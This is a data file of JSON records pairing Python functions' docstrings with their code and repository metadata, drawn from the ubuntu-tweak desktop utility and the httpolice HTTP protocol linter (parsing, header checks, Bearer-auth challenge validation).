{"docstring": "'''Two level: fatal and error'''\n", "func_signal": "def run_traceback(level, textview_only=False, text_only=False):\n", "code": "from ubuntutweak.gui import GuiBuilder\n\noutput = StringIO.StringIO()\nexc = traceback.print_exc(file=output)\n\nworker = GuiBuilder('traceback.ui')\n\ntextview = worker.get_object('%s_view' % level)\n\nbuffer = textview.get_buffer()\niter = buffer.get_start_iter()\nanchor = buffer.create_child_anchor(iter)\nbutton = Gtk.Button(label=_('Copy Error Message'))\nbutton.show()\n\ntextview.add_child_at_anchor(button, anchor)\n\nerror_text = \"\\nDistribution: %s\\nApplication: %s\\nDesktop:%s\\n\\n%s\" % (system.DISTRO,\n                                   system.APP,\n                                   system.DESKTOP,\n                                   output.getvalue())\n\nbuffer.insert(iter, error_text)\nbutton.connect('clicked', on_copy_button_clicked, error_text)\n\nif text_only:\n    return error_text\n\nif textview_only:\n    return textview\nelse:\n    dialog = worker.get_object('%sDialog' % level.capitalize())\n\n    to_report = (dialog.run() == Gtk.ResponseType.YES)\n\n    dialog.destroy()\n    output.close()\n\n    if to_report:\n        open_bug_report()", "path": "ubuntutweak\\common\\debug.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "#TODO may not be icon\n", "func_signal": "def install(self):\n", "code": "if self._to_extract_dir:\n    self._tarfile.extractall(os.path.expanduser('~/.icons'))\nelse:\n    new_dir = os.path.expanduser('~/.icons/%s' % self.install_name)\n    os.makedirs(new_dir)\n    self._tarfile.extractall(new_dir)\n\nreturn True", "path": "ubuntutweak\\utils\\tar.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "# The ``Bearer`` authentication scheme is actually defined\n# for proxies as well as for servers (RFC 6750 Section 1).\n# Squid even seems to support it:\n# https://wiki.squid-cache.org/Features/BearerAuthentication .\n# However, generalizing these checks to proxies is kind of a pain,\n# so for now we only handle the ``WWW-Authenticate`` series.\n# If this is ever extended to proxies, the notices must be adjusted.\n# Also note that some text in RFC 6750 only applies to servers\n# (where it says \"resource server\").\n", "func_signal": "def _check_bearer_challenge(resp, hdr, challenge):\n", "code": "if hdr.name != h.www_authenticate:      # pragma: no cover\n    return\n\nreq = resp.request\nrequest_has_token = None\nif req:\n    if req.is_tls is False:\n        resp.complain(1263)\n\n    # Did the request contain a bearer token in one of the defined forms?\n    request_has_token = (\n        (\n            req.headers.authorization.is_okay and\n            req.headers.authorization.item == auth.bearer\n        ) or\n        (\n            okay(req.url_encoded_data) and\n            u'access_token' in req.url_encoded_data\n        ) or\n        u'access_token' in req.query_params\n    )\n\nparams = challenge.param\n\nif isinstance(params, str) or not params:\n    # ``token68`` form or no parameters at all.\n    resp.complain(1264)\n    return\n\nfor dupe in params.duplicates():\n    if dupe in [u'realm', u'scope', u'error', u'error_description',\n                u'error_uri']:\n        resp.complain(1265, param=dupe)\n\nfor param in [u'scope', u'error', u'error_description', u'error_uri']:\n    if param in params:\n        syntax = getattr(rfc6749, param)\n        parse(params[param], syntax, resp.complain, 1266,\n              param=param, value=params[param])\n\nif resp.status == st.unauthorized and u'error' not in params and \\\n        req and req.headers.authorization.is_okay and \\\n        req.headers.authorization.item == auth.bearer:\n    # We don't report this if the token was passed in the URI or body,\n    # because the server may not implement those forms at all.\n    resp.complain(1267)\n\nif u'error' in params:\n    error_code = params[u'error']\n    expected_status = {\n        u'invalid_request': st.bad_request,\n        u'invalid_token': st.unauthorized,\n        u'insufficient_scope': st.forbidden,\n    }.get(error_code)\n    if expected_status and resp.status != expected_status:\n        resp.complain(1268, error_code=error_code,\n                      expected_status=expected_status)\n\nif req and req.headers.authorization.is_absent and not request_has_token:\n    for param in [u'error', u'error_description', u'error_uri']:\n        if param in params:\n            resp.complain(1269, param=param)", "path": "httpolice\\response.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "# Find the last `i` that had some Earley items --\n# that is, the last `i` where we could still make sense of the input data.\n", "func_signal": "def _build_parse_error(data, target_symbol, chart):\n", "code": "i, items = [(i, items)\n            for (i, (items, _, _)) in enumerate(chart)\n            if len(items) > 0][-1]\nfound = data[i : i + 1]\n\n# What terminal symbols did we expect at that `i`?\nexpected = OrderedDict()\nfor (symbol, rule, pos, start) in items:\n    next_symbol = rule.xsymbols[pos]\n    if isinstance(next_symbol, Terminal):\n        chars = format_chars(next_symbol.chars())\n        # And why did we expect it? As part of what nonterminals?\n        expected.setdefault(chars, set()).update(\n            _find_pivots(chart, symbol, start))\n\n    if symbol is target_symbol and next_symbol is None:\n        # This item indicates a complete parse of `target_symbol`,\n        # so if the input data just stopped there, that would work, too,\n        expected[u'end of data'] = None\n\nreturn ParseError(name=None, position=i,\n                  expected=list(expected.items()), found=found)", "path": "httpolice\\parse.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "# It would be nice to be able to compare headers by values, as in::\n#\n#   resp.headers.last_modified == req.headers.if_modified_since\n#\n# Unfortunately, there are places\n# (such as :meth:`httpolice.blackboard.Blackboard.complain`)\n# where we need header-to-header equality to be less magical.\n# And if we can't do this magic for equality,\n# there's no sense in doing it for other operations.\n# So we just say that comparing headers to headers is `NotImplemented`\n# (fall back to comparing their object identities).\n#\n# Now, the following form still works::\n#\n#   resp.headers.last_modified == req.headers.if_modified_since.value\n#\n# so we don't lose all that much.\n\n", "func_signal": "def _compare(self, other, op):\n", "code": "if isinstance(other, HeaderView):\n    return NotImplemented\nreturn self.is_okay and okay(other) and op(self.value, other)", "path": "httpolice\\header.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "\"\"\"Generate a plain-text report with check results.\n\n:param exchanges:\n    An iterable of :class:`~httpolice.Exchange` objects.\n    They must be already processed by :func:`~httpolice.check_exchange`.\n\n:param buf:\n    The file (or file-like object) to which the report will be written.\n    It must be opened in binary mode (not text).\n\n\"\"\"\n", "func_signal": "def text_report(exchanges, buf):\n", "code": "f1 = codecs.getwriter('utf-8')(buf)\nfor exch in exchanges:\n    with write_if_any(_exchange_marker(exch), f1) as f2:\n        if exch.request:\n            for complaint in exch.request.complaints:\n                _write_complaint_line(complaint, f2)\n        for resp in exch.responses:\n            with write_if_any(_response_marker(resp), f2) as f3:\n                for complaint in resp.complaints:\n                    _write_complaint_line(complaint, f3)\n        for complaint in exch.complaints:\n            _write_complaint_line(complaint, f2)", "path": "httpolice\\reports\\text.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "\"\"\"``sym >seal`` seals the `sym` symbol, then applies `seal` to it.\n\nThis causes the symbol to be treated as a unit, with a specific name\nand (usually) citation. It will then never be inlined into other\nsymbol's rules. This leads to an almost exact correspondence between\nthe layout of `Symbol` objects and the actual grammar given in RFCs.\nThis is also necessary for error reporting.\n\nSee also :func:`fill_names`.\n\n\"\"\"\n", "func_signal": "def __gt__(self, seal):\n", "code": "if self.name is None:\n    sealed = self\nelse:\n    sealed = SimpleNonterminal(rules=[Rule((self,))])\n(sealed.name, sealed.citation, sealed.is_pivot) = seal\nreturn sealed", "path": "httpolice\\parse.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "# `items`, `items_idx` and `items_set` together constitute\n# an inventory of Earley items at a certain position of the input.\n# ``(symbol, rule, pos, start)`` is the item we want to append to it,\n# unless it's already present there.\n\n# `items` is the master list that is used for iterating over all items.\n# `items_idx` is an index of items by their *next symbols*,\n# which speeds up some frequent lookups.\n# `items_set` is the set of all items,\n# which speeds up checking for presence of an item before adding it.\n\n# In fact, `items_set` stores \"fingerprints\" of items, not actual items.\n# This makes it faster, as object equality is reduced to integer equality.\n", "func_signal": "def _add_item(items, items_idx, items_set, symbol, rule, pos, start):\n", "code": "fingerprint = (id(symbol), id(rule), pos, start)\n\nif fingerprint not in items_set:\n    items_set.add(fingerprint)\n    items.append((symbol, rule, pos, start))\n    items_idx.setdefault(rule.xsymbols[pos], []).append(\n        (symbol, rule, pos, start))", "path": "httpolice\\parse.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "# This is generated on the fly every time,\n# because `self.sequence` can be mutated,\n# e.g. in :class:`httpolice.header.AltSvcView`.\n", "func_signal": "def dictionary(self):\n", "code": "r = {}\nfor k, v in self.sequence:\n    r.setdefault(k, []).append(v)\nreturn r", "path": "httpolice\\structure.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "# RFC 7230 section 3.2.2 permits combining field-values with a comma\n# even if we don't really know what the header is.\n", "func_signal": "def _parse(self):\n", "code": "entries, values = self._pre_parse()\nself._value = b','.join(values) if values else None\nself._entries = entries", "path": "httpolice\\header.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "\"\"\"Does this response carry a complete instance of its Content-Type?\"\"\"\n", "func_signal": "def content_is_full(self):\n", "code": "if self.status in [st.not_modified, st.early_hints]:\n    return False\nif self.status == st.partial_content and \\\n        self.headers.content_type != media.multipart_byteranges:\n    return False\nif okay(self.request):\n    return self.request.method != m.HEAD\nif self.body:\n    return True\nreturn None         # pragma: no cover", "path": "httpolice\\response.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "\"\"\"Create a terminal that accepts bytes from `min_` to `max_` inclusive.\"\"\"\n", "func_signal": "def octet_range(min_, max_):\n", "code": "bits = BitArray(256)\nfor i in range(min_, max_ + 1):\n    bits[i] = True\nreturn Terminal(bits=Bits(bits))", "path": "httpolice\\parse.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "\"\"\"Is it OK to inline this symbol into others (if possible)?\n\nEphemeral symbols are a side effect of constructing a grammar using our\ncombinators. For example, when we write::\n\n    foo = bar | baz | qux           > auto\n\nwe want `foo` to consist of three rules. But naturally Python\ninterprets this as ``(bar | baz) | qux``, where ``bar | baz`` is\nan ephemeral symbol -- it needs to be \"dissolved\" in the rules\nfor `foo`.\n\n\"\"\"\n", "func_signal": "def is_ephemeral(self):\n", "code": "if self._is_ephemeral is not None:\n    return self._is_ephemeral\nreturn (self.name is None)", "path": "httpolice\\parse.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "\"\"\"Apply all checks to the response `resp`.\"\"\"\n", "func_signal": "def check_response(resp):\n", "code": "check_response_itself(resp)\nif resp.request:\n    check_response_in_context(resp, resp.request)", "path": "httpolice\\response.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "# RFC 7230 section 3.3.3.\n\n", "func_signal": "def _parse_request_body(req, stream):\n", "code": "if req.headers.transfer_encoding:\n    codings = req.headers.transfer_encoding.value[:]\n    if codings.pop() == tc.chunked:\n        _parse_chunked(req, stream)\n    else:\n        req.body = Unavailable()\n        req.complain(1001)\n        stream.sane = False\n    while codings and okay(req.body):\n        _decode_transfer_coding(req, codings.pop())\n\nelif req.headers.content_length:\n    _process_content_length(req, stream)\n\nelse:\n    req.body = b''", "path": "httpolice\\framing1.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "\"\"\"\n>>> list(iterbytes(b'hello'))\n[b'h', b'e', b'l', b'l', b'o']\n\"\"\"\n", "func_signal": "def iterbytes(bs):\n", "code": "for b in bs:\n    yield bytes((b,))", "path": "httpolice\\util\\data.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "\"\"\"\n``string_excluding(t, ['foo', 'bar'])`` is the same as ``string(t)``,\nexcept it **never parses** the input strings \"foo\" and \"bar\"\n(case-insensitive).\n\nThis is used where the grammar special-cases certain strings. For example,\nconsider RFC 6266. Strictly speaking, the string::\n\n  filename*=qwertyuiop\n\nmatches the ``disposition-param`` production, because it matches\n``disp-ext-param``. But the spec obviously intends that a \"filename*\"\nparameter only be an ``ext-value``, as it is special-cased\nin ``filename-param``. Therefore, in our code for ``disp-ext-param``, we\nexclude \"filename*\" from the allowed parameter names.\n\nThis only works when the excluded strings are relatively few and short.\n\n\"\"\"\n", "func_signal": "def string_excluding(terminal, excluding):\n", "code": "initials = set(s[0:1].lower() for s in excluding if s)\n\nfree = terminal\nfor c in initials:\n    free = free - literal(c)\n\nr = free + string(terminal)\nfor c in initials:\n    continuations = [s[1:] for s in excluding if s[0:1].lower() == c]\n    r = r | literal(c) + string_excluding(terminal, continuations)\nif '' not in excluding:\n    r = r | subst(u'') << empty\nreturn r", "path": "httpolice\\parse.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "\"\"\"Process automatic names for all symbols in `scope`.\n\nWhen we write::\n\n  foobar = literal('foo') | literal('bar')\n\nthere is no way for `foobar` to know its own name (which is ``foobar``,\nimportant for error reporting), unless we post-process it with this\nfunction. It takes names from `scope` and writes them back into\nthe symbols. This only happens for symbols sealed with :func:`auto`\nor :func:`pivot`.\n\"\"\"\n", "func_signal": "def fill_names(scope, citation):\n", "code": "for name, x in scope.items():\n    if isinstance(x, Symbol) and x.name is _AUTO:\n        x.name = name.rstrip('_').replace('_', '-')\n        x.citation = citation", "path": "httpolice\\parse.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "# Firefox includes content on 304 responses, but we ignore it.\n", "func_signal": "def test_firefox_304():\n", "code": "[exch, _] = load_from_file('firefox_304.har')\nassert exch.responses[0].body == b''\nassert exch.responses[0].decoded_body == b''\nassert exch.responses[0].unicode_body == u''", "path": "test\\test_har_input.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "# It's questionable whether an `Unavailable` should ever compare equal\n# to another `Unavailable`, seeing as they might be failures in\n# different contexts (e.g. trying to parse the same string as two\n# different grammar symbols). But in practice, this behavior is useful.\n# See ``test/combined_data/1286_2`` for an example.\n", "func_signal": "def __eq__(self, other):\n", "code": "return isinstance(other, Unavailable) and \\\n    self.inner is not None and self.inner == other.inner", "path": "httpolice\\structure.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "# Work at the second level of nesting (forwarded-pairs,\n# not forwarded-elements).\n", "func_signal": "def _process_parsed(self, entry, parsed):\n", "code": "elements = [super(ForwardedView, self)._process_parsed(entry, elem)\n            for elem in parsed]\n\n# ``Forwarded`` is probably more likely than other headers to appear\n# multiple times in a message (as appended by intermediaries), so\n# it's more important to report these notices on a specific entry\n# rather than on the entire `ForwardedView` in `check_request`.\nfor elem in elements:\n    for duped in duplicates(param for (param, _value) in elem):\n        self.message.complain(1296, entry=entry, param=duped)\nif len(elements) > 1 and all(len(elem) == 1 for elem in elements):\n    if not duplicates(param for [(param, _value)] in elements):\n        self.message.complain(1297, entry=entry,\n                              n_elements=len(elements))\n\nreturn elements", "path": "httpolice\\header.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
{"docstring": "\"\"\"\n:param name: Name of the input stream (file) with the error, or `None`.\n:param position: Byte offset at which the error was encountered.\n:param expected:\n    List of ``(description, symbols)``, where `description` is\n    a free-form description of what could satisfy parse at that\n    `position` in the input, and `symbols` is an iterable\n    of :class:`Symbol` as part of which this `description` would be\n    expected. `description` may be `None` if an entire symbol was\n    expected at that `position` and no further detail is available.\n:param found:\n    A bytestring of length 1 or 0 (for EOF) that was found\n    at `position`, or `None` if irrelevant.\n\n\"\"\"\n", "func_signal": "def __init__(self, name, position, expected, found=None):\n", "code": "super(ParseError, self).__init__(\n    u'unexpected input at byte position %r' % position)\nself.name = name\nself.position = position\nself.expected = expected\nself.found = found", "path": "httpolice\\parse.py", "repo_name": "vfaronov/httpolice", "stars": 938, "license": "other", "language": "python", "size": 1686}
